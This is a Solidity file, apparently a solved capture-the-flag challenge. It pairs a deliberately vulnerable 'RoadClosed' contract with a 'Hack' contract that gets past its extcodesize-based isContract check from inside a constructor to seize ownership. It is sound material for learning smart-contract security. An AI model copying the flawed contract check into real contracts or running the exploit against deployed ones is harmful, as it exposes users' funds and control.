/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

contract RoadClosed {
    bool hacked;
    address owner;
    address pwner;
    mapping(address => bool) whitelistedMinters;

    function isContract(address addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function isOwner() public view returns (bool) {
        if (msg.sender == owner) {
            return true;
        } else return false;
    }

    constructor() {
        owner = msg.sender;
    }

    function addToWhitelist(address addr) public {
        require(!isContract(addr), "Contracts are not allowed");
        whitelistedMinters[addr] = true;
    }

    function changeOwner(address addr) public {
        require(whitelistedMinters[addr], "You are not whitelisted");
        require(msg.sender == addr, "address must be msg.sender");
        require(addr != address(0), "Zero address");
        owner = addr;
    }

    function pwn(address addr) external payable {
        require(!isContract(msg.sender), "Contracts are not allowed");
        require(msg.sender == addr, "address must be msg.sender");
        require(msg.sender == owner, "Must be owner");
        hacked = true;
    }

    function pwn() external payable {
        require(msg.sender == pwner);
        hacked = true;
    }

    function isHacked() public view returns (bool) {
        return hacked;
    }
}



contract Hack {
    address public target;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
        RoadClosed(target).addToWhitelist(address(this));
        RoadClosed(target).changeOwner(address(this));
        RoadClosed(target).pwn(address(this));
    }

    function isOwner() external view returns (bool) {
        bool res = RoadClosed(target).isOwner();
        return res;
    }
}